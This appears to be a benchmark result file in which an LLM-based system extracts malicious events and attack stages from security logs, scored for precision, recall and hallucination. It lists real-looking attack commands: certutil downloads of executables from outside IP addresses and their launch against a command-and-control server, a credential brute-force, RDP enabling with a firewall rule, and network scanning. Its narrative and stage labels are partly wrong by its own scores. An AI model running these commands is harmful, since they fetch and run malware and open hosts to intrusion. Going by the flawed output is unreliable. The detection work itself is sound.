@@ -1,0 +1,76 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Execution"
+      },
+      {
+        "command": "winbrute.exe administrator_pass.txt administrator",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f; netsh advfirewall firewall add rule name='Remote Desktop' dir=in action=allow protocol=TCP localport=3389;",
+        "stage": "Defense Evasion/Persistence"
+      },
+      {
+        "command": "nbtscan.exe 192.168.0.244/24",
+        "stage": "Discovery/Lateral Movement"
+      }
+    ],
+    "narrative": "Attackers exploited CertUtil to deliver a malicious payload, establishing a foothold. They executed credential-harvesting efforts via brute-force tools, created backdoor accounts, and modified system configurations for persistence. Utilizing PAEXEC for remote exploitation enabled lateral movement towards adjacent systems. Ongoing intelligence gathering employed system commands and scheduled tasks supported by active command and control infrastructure.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 32777,
+      "completion_tokens": 5570,
+      "total_tokens": 38347,
+      "wall_clock_s": 53.498,
+      "parse_retries": 2
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.5,
+      "recall": 0.42857142857142855,
+      "f1": 0.4615384615384615,
+      "tp": 3,
+      "fp": 3,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 6,
+      "fn": 6,
+      "recall_partial": 0.16666666666666666
+    },
+    "hallucination_rate": 0.1,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 32777,
+      "completion_tokens": 5570,
+      "total_tokens": 38347,
+      "wall_clock_s": 53.498,
+      "parse_retries": 2
+    }
+  },
+  "meta": {
+    "variant": "primus_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA RTX 6000 Ada Generation",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
